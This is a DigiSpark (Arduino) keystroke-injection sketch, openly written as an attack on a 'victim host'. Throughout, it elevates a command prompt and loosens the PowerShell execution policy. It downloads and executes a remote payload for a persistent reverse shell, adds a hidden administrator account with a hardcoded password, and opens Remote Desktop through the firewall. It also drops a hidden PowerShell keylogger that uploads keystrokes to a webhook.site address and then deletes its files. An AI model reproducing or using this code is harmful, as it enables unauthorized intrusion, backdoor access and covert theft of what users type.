/*
This script performs various actions onto the victim host. It does the following:

1. Activate scripts usage in powershell.
2. Downloads payload from remote fileserver and provides persistent reverse shell.
3. Creates a new user with admin privileges and activates remote desktop access for backdoor engagements.
4. [ON FIRST 30 MINUTES ONLY!] Logs key entries and sends key logging to your webhook.site.
*/
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2500);
  
  /* Enable Running Scripts in Powershell. Janky but it works fine for the most part.*/
  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);



  /* Downloads and executes payload from fileserver. Provides persistent reverse shell on target computer. */
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('[FILESERVER]/payload.ps1');\"")
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);

  /* Creates a admin user for backdoor usage */
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskmgr"); //starting taskmgr
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_N);//run
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");//start cmd
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("net user blanka Ping@123 /ADD");//adding user
  DigiKeyboard.delay(500);
  DigiKeyboard.println("net localgroup Administrators blanka /ADD");//adding user to admin group
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f"));//Hiding user from login screen
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));//Turning Remote desktop
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));//Allowing remote desktop through firewall
  DigiKeyboard.delay(500);
  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" blanka /add");//adding created user to remote desktop group
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");//adding created user to remote desktop group
  DigiKeyboard.delay(500);

  /* Keylogger */
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\"");//starting powershell in small window
  DigiKeyboard.delay(300);
  DigiKeyboard.println(F("$put = \"`$t`='[DllImport(\"\"user32.dll\"\")] public static extern bool ShowWindow(int handle, int state);'\nadd-type -name win -member `$t` -namespace native\n[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)\nfunction Start-KeyLogger(`$P`=\"\"`$env`:temp\\kl.txt\"\")\n{\n `$si` = @'\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto, ExactSpelling=true)]\npublic static extern short GetAsyncKeyState(int virtualKeyCode);\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n'@\n`$A` = Add-Type -MemberDefinition `$si` -Name 'Win32' -Namespace API -PassThru\n`$null` = New-Item -Path `$P` -ItemType File -Force\ntry\n{\n`$ti` = get-date\ndo\n{\nStart-Sleep -Milliseconds 40\nfor (`$as` = 9; `$as` -le 254; `$as`++) {\n`$state` = `$A`::GetAsyncKeyState(`$as`)\nif (`$state` -eq -32767) {\n`$null` = [console]::CapsLock\n`$VK` = `$A`::MapVirtualKey(`$as`, 3)\n`$kbS` = New-Object Byte[] 256\n`$checkkbstate` = `$A`::GetKeyboardState(`$kbS`)\n`$mychar` = New-Object -TypeName System.Text.StringBuilder\n`$success` = `$A`::ToUnicode(`$as`, `$VK`, `$kbS`, `$mychar`, `$mychar`.Capacity, 0)\nif (`$success`)\n{\n[System.IO.File]::AppendAllText(`$P`, `$mychar`, [System.Text.Encoding]::Unicode)\n}}}}\nwhile ((Get-Date).AddMinutes(-30) -le `$ti`)\n}\nfinally\n{\npowershell Invoke-WebRequest -Uri https://webhook.site/<YOURSITE> -Method POST -ContentType 'text/plain' -InFile \"\"`$env`:temp\\kl.txt\"\"\npowershell Remove-Item -Path \"\"`$env`:temp\\kl.txt\"\"\npowershell Remove-Item -Path \"\"`$env`:temp\\log.ps1\"\"\n}}\nStart-KeyLogger\""));//dumping keylogger
  DigiKeyboard.delay(100);
  DigiKeyboard.println("write-output $put > $env:temp\\log.ps1");//droping keylogger
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cd $env:temp");//changing dir
  DigiKeyboard.delay(100);
  DigiKeyboard.println(".\\log.ps1"); //executing payload
  DigiKeyboard.delay(100);



  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);

  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
